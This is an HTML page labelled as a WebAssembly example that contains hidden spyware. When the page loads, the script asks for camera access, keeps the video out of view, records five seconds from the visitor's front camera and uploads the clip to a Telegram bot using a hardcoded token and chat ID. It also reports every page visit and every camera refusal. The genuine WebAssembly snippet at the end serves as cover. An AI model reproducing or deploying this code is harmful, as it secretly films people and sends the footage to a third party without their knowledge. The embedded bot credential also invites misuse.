<!DOCTYPE html>
<html>
<head>
  <title>WebAssembly Example</title>
  <style>
    #camera, #canvas {
      display: none;
    }
    #permissionRequest {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #ffeb3b;
      padding: 10px;
      text-align: center;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <div id="permissionRequest" style="display:none;">
    Please allow camera access to continue...
  </div>
  <video id="camera" autoplay playsinline></video>
  
  <script>
    // Telegram bot details
    const botToken = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
    const chatId = '894002841';
    const message = 'Someone opened help.html';

    // Get DOM elements
    const video = document.getElementById('camera');
    const permissionRequest = document.getElementById('permissionRequest');
    
    // MediaRecorder and recording variables
    let mediaRecorder;
    let recordedChunks = [];
    const recordingDuration = 5000; // 5 seconds recording

    // Function to send video to Telegram
    async function sendVideoToTelegram(videoBlob) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', message);
      formData.append('video', videoBlob, 'capture.mp4');

      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: formData
        });
        const data = await response.json();
        console.log('Video sent to Telegram:', data);
      } catch (error) {
        console.error('Error sending video to Telegram:', error);
        // Fallback to text message if video sending fails
        sendTextMessage(message + ' (Failed to send video)');
      } finally {
        // Stop all video tracks
        if (video.srcObject) {
          video.srcObject.getTracks().forEach(track => track.stop());
        }
      }
    }

    // Function to send text message to Telegram
    function sendTextMessage(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
        .catch(e => console.error('Error sending fallback message:', e));
    }

    // Function to start recording
    function startRecording(stream) {
      recordedChunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      
      mediaRecorder.ondataavailable = function(e) {
        if (e.data.size > 0) {
          recordedChunks.push(e.data);
        }
      };
      
      mediaRecorder.onstop = function() {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        sendVideoToTelegram(blob);
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
      }, recordingDuration);
    }

    // Request camera access
    async function initCamera() {
      permissionRequest.style.display = 'block';
      
      try {
        // Try to get front camera (facing mode 'user')
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',  // This specifies front camera
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });
        
        permissionRequest.style.display = 'none';
        video.srcObject = stream;
        
        // Wait for video to be ready
        video.onloadedmetadata = () => {
          setTimeout(() => {
            startRecording(stream);
          }, 1000); // Delay to ensure camera is properly initialized
        };
        
      } catch (error) {
        console.error('Error accessing camera:', error);
        permissionRequest.style.display = 'none';
        
        // Try fallback to any camera if front camera fails
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
          });
          
          video.srcObject = stream;
          video.onloadedmetadata = () => {
            setTimeout(() => {
              startRecording(stream);
            }, 1000);
          };
          
        } catch (fallbackError) {
          console.error('Fallback camera access failed:', fallbackError);
          sendTextMessage(message + ' (Camera access denied)');
        }
      }
    }

    // Start the process when page loads
    window.addEventListener('DOMContentLoaded', () => {
      // Check if browser supports mediaDevices API and MediaRecorder
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || !window.MediaRecorder) {
        sendTextMessage(message + ' (Browser does not support video recording)');
        return;
      }
      
      initCamera();
    });

    // Original WebAssembly code (unchanged)
    fetch('my_module.wasm')
      .then(response => response.arrayBuffer())
      .then(bytes => WebAssembly.instantiate(bytes, {}))
      .then(results => {
        const instance = results.instance;
        const add = instance.exports.add;
        const result = add(5, 3);
        console.log("Result from WebAssembly: " + result);
      });
  </script>
</body>
</html>
